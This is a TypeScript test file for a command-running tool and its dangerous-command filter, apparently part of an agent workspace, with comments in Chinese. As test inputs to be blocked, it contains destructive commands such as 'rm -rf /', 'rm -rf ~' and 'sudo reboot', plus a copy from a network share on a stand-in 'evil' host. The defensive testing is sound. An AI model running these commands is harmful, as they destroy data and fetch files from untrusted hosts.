import { test, expect, beforeEach, afterEach, describe } from 'bun:test'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { realpathSync } from 'node:fs'
import { Workspace } from '../workspace/workspace'
import type { ToolContext } from './Tool'
import { runCommandTool } from './runCommandTool'
import { isDangerousCommand } from './dangerousCommand'

let root: string
let ctx: ToolContext
beforeEach(() => {
  // realpath:macOS 的 /tmp 是 /private/tmp 的软链,pwd 会返回真实路径
  root = realpathSync(mkdtempSync(join(tmpdir(), 'ws-')))
  ctx = { workspace: new Workspace(root) }
})
afterEach(() => {
  rmSync(root, { recursive: true, force: true })
})

test('run_command runs a command and captures stdout', async () => {
  const out = await runCommandTool.execute({ command: 'echo hello-w2' }, ctx)
  expect(out).toContain('hello-w2')
})

test('run_command runs with the workspace as cwd', async () => {
  const out = await runCommandTool.execute({ command: 'pwd' }, ctx)
  expect(out).toContain(root)
})

test('run_command reports a non-zero exit', async () => {
  const out = await runCommandTool.execute({ command: 'exit 3' }, ctx)
  expect(out).toContain('3')
})

test('isDangerousCommand flags catastrophic commands', () => {
  expect(isDangerousCommand('rm -rf /')).toBe(true)
  expect(isDangerousCommand('rm -rf ~')).toBe(true)
  expect(isDangerousCommand('sudo reboot')).toBe(true)
  expect(isDangerousCommand('ls -la')).toBe(false)
})

test('run_command refuses a dangerous command', async () => {
  await expect(runCommandTool.execute({ command: 'rm -rf /' }, ctx)).rejects.toThrow(/危险命令/)
})

describe('dangerousCommand W3 补强', () => {
  test('rm 通配/盘符根命中', () => {
    expect(isDangerousCommand('rm -rf *')).toBe(true)
    expect(isDangerousCommand('rm -rf /*')).toBe(true)
    expect(isDangerousCommand('rm -rf C:\\')).toBe(true)
  })
  test('命令内 UNC 命中', () => {
    expect(isDangerousCommand('copy \\\\evil\\share\\x .')).toBe(true)
  })
  test('工作区内正常命令不误杀', () => {
    expect(isDangerousCommand('rm -rf build/cache')).toBe(false)
    expect(isDangerousCommand('npm run build')).toBe(false)
  })
  test('行为对齐补充:盘符/UNC/通配新模式不牵连真实命令', () => {
    // 盘符根(危险) vs 具体嵌套路径(真实删除目标,不该拦):新模式只认「盘符+冒号+可选斜杠+结尾」为根
    expect(isDangerousCommand('rm -rf C:\\Users\\foo\\Desktop\\myproject')).toBe(false)
    // 普通单反斜杠 Windows 路径不是 UNC(UNC 特征是双反斜杠开头的网络共享路径)
    expect(isDangerousCommand('copy C:\\temp\\file.txt D:\\backup\\')).toBe(false)
    // 通配裁剪只在「* 或 /* 紧跟标志位」时命中,精确扩展名/子目录通配这类常见清理命令不误杀
    expect(isDangerousCommand('rm -rf *.log')).toBe(false)
    expect(isDangerousCommand('rm -rf node_modules/*')).toBe(false)
  })
})
